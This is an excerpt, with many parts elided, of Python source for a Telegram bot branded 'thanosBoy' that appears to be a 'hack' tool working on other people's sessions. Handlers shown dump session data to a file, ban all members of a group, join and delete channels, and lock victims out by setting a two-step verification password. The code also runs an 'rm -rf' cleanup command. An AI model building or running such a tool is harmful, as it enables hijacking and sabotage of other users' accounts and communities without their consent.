...
thanosboy = 2024465080


from telethon import Button, custom, events

THANOS_PIC = "https://te.legra.ph/file/d3785d49b2c5e6f00bc67.jpg"
...
async def killer():
    ...
    starkbot = await rishu.tgbot.get_me()
...
@bot.tgbot.on(events.NewMessage(pattern="/start", func=lambda x: x.is_group))
...
@bot.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
async def help(event):
    ...
    if event.query.user_id is not bot.uid:
        ...
        await tgbot.send_message(
            event.chat_id,
            message=f"Hey, I am your {bot_id}'s assistant bot.\nI Am Here To Help U \n\nPowered By [thanosuserbot](https://t.me/thanosuserbot_OP)",
            buttons=[
                [
                    Button.url(" Support ", "https://t.me/thanosuserbot_OP"),
                    Button.url(" Updates ", "https://t.me/thanosuserbot_AI"),
                ],
                [
...
async def rel(event):
    if event.query.user_id == bot.uid:
        await event.answer("ShutDown Շђคภ๏ร-קг๏...", cache_time=0, alert=True)
        if BOTLOG:
...
@bot.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"res_tart")))
async def res_ttart(event):
    if event.query.user_id == bot.uid:
        await event.answer("Restarting Please Wait 4 min... ", cache_time=0, alert=True)
        if BOTLOG:
            thanos = await event.client.send_message(
                BOTLOG_CHATID, "# RESTART \n" "Bot Restarted"
            )
        try:
            await thanos.disconnect()
...
@bot.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"setvar")))
...
@bot.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        if len(i) > 3855:
            ...
            file.write(i + "\n\nDetails BY thanosBoy")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(
                i + "\n\nThanks For using thanosBoyBot. \n/hack", buttons=keyboard
            )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            i + "\n\nThanks For using thanosBoy Bot.\n/hack", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            "Banning all members. Thanks For using thanosBoy Bot", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(i + "\n\nThanks For using thanosBoy Bot", buttons=keyboard)
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            "Joined the Channel/Group Thanks For using thanosBoy Bot", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            "Deleted the Channel/Group Thanks For using thanosBoyBot.", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        if i:
            await event.reply(
                "User don't have two step thats why now two step is `thanosBoy Bot Is best` you can login now\n\nThanks For using thanosBoy Bot.",
                buttons=keyboard,
            )
        else:
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        try:
            ...
            await event.respond(
                "SEND THIS ERROR TO - @thanos_Userbot\n**LOGS**\n" + str(e)
            )
